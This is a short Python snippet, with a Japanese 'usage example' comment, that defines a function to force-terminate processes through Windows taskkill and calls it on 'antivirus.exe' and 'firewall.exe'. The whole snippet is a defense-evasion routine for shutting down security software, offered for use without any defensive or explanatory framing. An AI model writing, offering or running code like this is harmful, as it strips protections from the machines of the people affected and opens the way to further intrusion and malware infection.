import subprocess

def disable_security_tool_process(tool_name):
    subprocess.call(["taskkill", "/IM", tool_name, "/F"])

# 使用範例
disable_security_tool_process("antivirus.exe")
disable_security_tool_process("firewall.exe")